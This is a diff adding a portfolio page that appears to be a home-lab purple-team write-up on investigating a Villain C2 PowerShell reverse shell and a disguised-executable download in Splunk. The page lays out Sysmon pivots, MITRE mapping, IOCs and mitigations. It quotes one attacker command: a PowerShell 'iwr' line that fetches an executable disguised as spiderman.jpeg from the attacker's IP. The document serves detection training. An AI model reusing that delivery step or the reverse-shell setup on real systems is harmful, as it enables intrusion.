@@ -1,0 +1,219 @@
+<!-- SOC / Villain C2 Reverse Shell Detection in Splunk -->
+<div class="detail-header">
+  <a href="#" class="back-button">← Back to Portfolio</a>
+  <h1>Detecting a C2 Reverse Shell &amp; Disguised-Payload Delivery in Splunk</h1>
+  <p>
+    <span class="tag">Splunk</span>
+    <span class="tag">Sysmon</span>
+    <span class="tag">Threat Detection</span>
+    <span class="tag">MITRE ATT&amp;CK</span>
+    <span class="tag">Villain C2</span>
+    <span class="tag">Incident Response</span>
+    <span class="tag">Purple Team</span>
+  </p>
+</div>
+
+<div class="detail-content">
+
+  <div class="step">
+    <h3>Executive Summary</h3>
+    <p>
+      A purple-team exercise in an isolated home lab. Using the Villain C2 framework from a Kali attacker VM, a
+      PowerShell reverse shell was executed against a Sysmon-monitored Windows 10 endpoint, alongside a
+      disguised-executable delivery and a benign file-transfer demonstration. The activity was then investigated
+      entirely from the defender's side in Splunk to reconstruct the full attack chain.
+    </p>
+    <p>
+      Three threads emerged: (1) a batch file downloaded a Windows executable disguised as <em>spiderman.jpeg</em> that
+      was delivered to disk but never executed; (2) a payload was staged locally with a Bat-to-EXE converter; and
+      (3) the actual compromise — a PowerShell ISE process established an outbound reverse shell to the attacker over
+      TCP 443, followed by hands-on-keyboard reconnaissance. The write-up is also honest about a real detection limit:
+      with Sysmon-only logging (no PowerShell Script Block Logging, no EDR), commands typed inside the live shell were
+      not individually recorded.
+    </p>
+  </div>
+
+  <div class="step">
+    <h3>Lab Environment</h3>
+    <ul>
+      <li><strong>Attacker:</strong> Kali Linux — Villain C2 + Python <code>http.server</code> — 192.168.253.130</li>
+      <li><strong>Victim:</strong> Windows 10 (DESKTOP-RB4I4KI) — Sysmon (SwiftOnSecurity config) + Splunk Universal Forwarder</li>
+      <li><strong>SIEM:</strong> Splunk Enterprise on Ubuntu Server — Sysmon received on TCP 9997, index <code>sysmon</code></li>
+    </ul>
+    <div class="note">
+      <strong>Note:</strong> the compromised account is <code>DESKTOP-RB4I4KI\John doe</code> (Medium integrity — no
+      privilege escalation). The <code>S-1-5-18</code> UserID in Sysmon event headers is the SYSTEM account that
+      <em>writes</em> the log, not the user who ran the process.
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>MITRE ATT&amp;CK Mapping</h3>
+    <ul>
+      <li><strong>T1059.001 / T1059.003</strong> — Command &amp; Scripting Interpreter: PowerShell / Windows Command Shell</li>
+      <li><strong>T1204.002</strong> — User Execution: Malicious File (double-clicked <code>.bat</code>)</li>
+      <li><strong>T1027 / T1562.001</strong> — Obfuscated Files or Information / Impair Defenses (AMSI bypass)</li>
+      <li><strong>T1036</strong> — Masquerading (PE delivered as <code>spiderman.jpeg</code>)</li>
+      <li><strong>T1105</strong> — Ingress Tool Transfer (<code>iwr</code> downloads)</li>
+      <li><strong>T1071.001</strong> — Application Layer Protocol: Web (C2 over TCP 443)</li>
+      <li><strong>T1033 / T1082</strong> — System Owner/User &amp; System Information Discovery (<code>whoami</code>, <code>ipconfig</code>)</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <h3>1. Triage — Pivot on the Attacker IP</h3>
+    <p>The investigation began from a single known indicator — the attacker IP — and pivoted outward through process
+       lineage. Because Sysmon was indexed as raw XML (<code>XmlWinEventLog</code>), fields were extracted at search
+       time with <code>spath</code> and known values matched as raw text.</p>
+    <div class="command-box">index=sysmon 192.168.253.130 | spath
+| table _time EventID Image CommandLine DestinationIp DestinationPort ProcessGuid</div>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/01-ip-pivot.png" alt="Splunk pivot on attacker IP" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 Pivoting on the attacker IP 192.168.253.130 in Splunk.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>2. First Event — a Disguised Download Chain</h3>
+    <p>The earliest event shows <code>cmd.exe</code> running <code>rat.bat</code> from the user's Documents folder, which
+       spawned PowerShell to download a file named <code>spiderman.jpeg</code> from the attacker. The parent chain is
+       <code>explorer.exe → cmd /c rat.bat → powershell.exe</code> — i.e. the user double-clicked a malicious batch
+       file (T1204.002). The <code>cmd.exe</code> hash is just the legitimate Windows binary; the malicious element is
+       the argument it was told to run.</p>
+    <div class="command-box">powershell -c "iwr 'http://192.168.253.130/spiderman.jpeg' -O spiderman.jpeg"</div>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/02-ratbat-download.png" alt="PowerShell download launched by rat.bat" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 First event — PowerShell download launched by rat.bat via cmd.exe.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>3. Enrichment — the "Image" is a Windows Executable</h3>
+    <p>The SHA256 of the downloaded file was checked against VirusTotal, which identified it as a Windows PE executable
+       — not a JPEG. This is Masquerading (T1036): an executable disguised with an image extension.</p>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/03-virustotal-pe-not-jpeg.png" alt="VirusTotal shows a Windows executable, not an image" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 VirusTotal identifies the file as a Windows PE, not an image.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>4. Did the Payload Execute? Opened, Not Run</h3>
+    <p>Pivoting on the file name showed <code>spiderman.jpeg</code> was opened by <code>Photos.exe</code> — the signed
+       Windows image viewer. The key analytical point: the file appears only as an <em>argument</em> passed to other
+       processes, never as a process <code>Image</code> of its own. Because the <code>.jpeg</code> extension routes it to
+       the image viewer (which cannot execute a PE), the payload was <strong>delivered to disk but did not execute as
+       code. Delivery succeeded; detonation did not.</strong></p>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/04-not-executed.png" alt="spiderman.jpeg only ever an argument, never executed" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 The file is only ever an argument — confirming it was not executed as code.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>5. The Real C2 — PowerShell ISE Reverse Shell over 443</h3>
+    <p>A second thread in the same IP pivot revealed the actual compromise: a PowerShell ISE process making an outbound
+       connection (Sysmon Event ID 3) to the attacker on TCP 443. Port 443 lets the C2 blend with normal HTTPS; the tell
+       is not the port but that <code>powershell_ise.exe</code> — not a browser — is holding the connection.</p>
+    <div class="note">
+      <strong>Malicious process:</strong> <code>PowerShell_ISE.exe</code> ·
+      ProcessGuid <code>{07ecc6ec-3f41-6ab8-921c-000000003b00}</code> ·
+      parent <code>explorer.exe</code> ·
+      network (EID 3) → <code>192.168.253.130:443</code>.
+    </div>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/05-ise-443-c2.png" alt="PowerShell ISE outbound connection to attacker on 443" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 The real C2 — PowerShell ISE connecting to the attacker on TCP 443.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>6. Ingress Tool Transfer &amp; Reconnaissance</h3>
+    <p>A file <code>payload.ps1</code> was found at <code>C:\Users\Public\payload.ps1</code>. On the attacker side it was
+       served from a Python web server on Kali and pulled down with <code>Invoke-WebRequest</code> — a clean demonstration
+       of Ingress Tool Transfer (T1105). Hands-on-keyboard discovery (e.g. <code>whoami</code>) followed via the shell.</p>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/06-kali-serve-payload.png" alt="Kali http.server serving payload.ps1" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 Attacker side: payload.ps1 served from Kali's http.server and pulled by the victim.</div>
+    </div>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/07-whoami-recon.png" alt="whoami reconnaissance in the session" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 whoami executed through the shell — standard post-exploitation discovery.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>Analyst Notes</h3>
+    <div class="note">
+      <strong>payload.ps1 is not an actual PowerShell payload.</strong> Despite the <code>.ps1</code> extension, it was
+      created on the attacker with a plain <code>echo</code> ("this is a fake payload script") — a harmless placeholder
+      used only to demonstrate the transfer technique. Detection keys on the <em>behaviour</em> (a process reaching an
+      external IP and writing a file), not the file's contents, which an analyst would not have at alert time.
+    </div>
+    <div class="note">
+      <strong>Obtaining the hash — lab vs. production.</strong> The file never executed, so Sysmon captured no hash
+      (EID 1 only hashes the executing image; EID 11 file-creation has no hash by default). It was hashed directly on the
+      host with <code>Get-FileHash</code>; VirusTotal returned no matches, consistent with a locally-created, unknown
+      file. In production an analyst would not touch the host — the hash would come from EDR, or the file would be hashed
+      / collected via EDR live-response (e.g. CrowdStrike RTR, Defender Live Response) while preserving evidence.
+    </div>
+    <div class="lab-image">
+      <img src="assets/images/soc-villain-c2/08-virustotal-empty.png" alt="VirusTotal returns no matches for payload.ps1" onerror="this.style.display='none'">
+      <div class="lab-image-caption">📸 VirusTotal returns no matches for the locally-created file.</div>
+    </div>
+  </div>
+
+  <div class="step">
+    <h3>Visibility Gaps &amp; Limitations</h3>
+    <p>This lab ran on Sysmon-only telemetry with no PowerShell Script Block Logging and no EDR — a real detection
+       constraint worth stating plainly:</p>
+    <ul>
+      <li>Commands typed inside the live shell (<code>dir</code>, <code>type systeminfo.txt</code>,
+          <code>type sysmonconfig-export.xml</code>) ran inside the existing PowerShell process and spawned no new
+          processes, so Sysmon logged no Event ID 1 for them — they are effectively invisible here.</li>
+      <li>Without Script Block Logging (Event ID 4104), the actual script content executed by the shell is not recorded.</li>
+      <li>Without EDR, there is no command-line history, no automatic hashing of non-executed files, and no behavioural
+          telemetry tying individual actions to the session.</li>
+    </ul>
+    <p><strong>Net effect:</strong> the investigation proves a reverse shell was established and sees process creation,
+       network connections and file writes — but not most of what the attacker did once inside. Recommended fix: enable
+       Script Block Logging + Module Logging via GPO, forward the PowerShell/Operational and Security channels to Splunk,
+       and add an EDR agent.</p>
+  </div>
+
+  <div class="step">
+    <h3>Indicators of Compromise</h3>
+    <ul>
+      <li><strong>Attacker / C2 IP:</strong> 192.168.253.130 (port 443, reverse shell)</li>
+      <li><strong>spiderman.jpeg</strong> (PE masquerading as image) SHA256: <code>9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3</code></li>
+      <li><strong>PowerShell_ISE.exe</strong> (C2 session) SHA256: <code>1172951D8B1AA4CF9D0AC9F72AE344C5896CE4286C790A1F0DFF8A6F71A5772E</code></li>
+      <li><strong>payload.ps1</strong> (benign placeholder) SHA256: <code>1BE5850BCF05057F36050F714311C75CF36DFB2D8B9FF9B1FE4B0DBCF31A5F16</code></li>
+      <li><strong>Files:</strong> <code>C:\Users\John doe\Documents\rat.bat</code>, <code>newps.bat</code>, <code>C:\Users\Public\payload.ps1</code></li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <h3>Findings &amp; Recommended Mitigations</h3>
+    <p>The pattern is consistent with local tooling/testing on the host, with the single clear external-C2 event being
+       the ISE reverse shell on 443 — the event that warrants immediate escalation and host isolation. Prioritising it
+       over the noisier-but-failed disguised-file thread is the key triage judgement.</p>
+    <ul>
+      <li>Alert on PowerShell / PowerShell ISE making outbound connections to external IPs (especially raw IPs on 80/443).</li>
+      <li>Alert on script interpreters spawned from Explorer/Office/batch files, and <code>cmd /c</code> running <code>.bat</code> from user-writable folders.</li>
+      <li>Enforce PowerShell Constrained Language Mode + restrictive execution policy; enable AMSI and Script Block Logging.</li>
+      <li>Flag files whose true type does not match their extension, and executables run from Temp / Public.</li>
+      <li>On a confirmed C2 connection, isolate the host via EDR, block the destination, and preserve for forensics.</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <h3>Conclusion</h3>
+    <p>From a single indicator, the full attack chain was reconstructed in Splunk using Sysmon process-lineage pivoting
+       — the failed disguised-executable delivery, the local staging, and the successful ISE reverse shell over 443 —
+       with enrichment and MITRE mapping throughout, and an honest account of the Sysmon-only blind spots. The exercise
+       demonstrates operating a SIEM end-to-end from the defender's seat, informed by an offensive background that makes
+       each attacker action legible in telemetry.</p>
+    <p style="color: var(--muted); font-size: 0.85rem;">Conducted in an isolated personal lab against systems I own. Sample hashes and IPs are from the lab environment.</p>
+  </div>
+
+</div>
